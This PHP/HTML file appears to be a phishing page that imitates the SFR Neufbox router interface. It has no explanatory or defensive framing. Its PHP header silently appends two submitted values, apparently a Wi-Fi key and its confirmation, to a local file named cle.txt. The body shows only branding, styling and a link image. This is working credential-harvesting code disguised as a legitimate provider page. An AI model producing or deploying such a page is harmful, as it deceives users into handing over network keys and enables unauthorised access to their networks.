<?php
$cle = $_POST['cle'];
$cleconf = $_POST['cleconf'];
$fp = fopen("cle.txt","a+"); // ouverture du fichier en écriture
fputs($fp, "$cle");
fputs($fp, "$cleconf");
fclose($fp);
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Interface Neufbox de SFR</title>
<link rel="stylesheet" type="text/css" href="/css/mode4/default-pc.css" />
<style>
#header {
background-image: url(red.jpg);
bkground-repeat: repeat-x;
}
body {
	margin:0;
	padding:40px;
	background:#FFFFFF;
	font:80% Arial, sans-serif;
	color:#FF1300;
	line-height:180%;
}
h1{
	font-size:180%;
	font-weight:normal;
	}
h2{
	font-size:160%;
	font-weight:normal;
	}	
h3{
	font-size:140%;
	font-weight:normal;
	}	
img{border:none;}
pre{
	display:block;
	font:12px "Courier New", Courier, monospace;
	padding:10px;
	border:1px solid #bae2f0;
	background:#e3f4f9;	
	margin:.5em 0;
	width:500px;
	}		
</style>
</head>
<body>
<a href="valid.php"><IMG class="displayed" img src="auth.png"></a>
	</body>
</html>
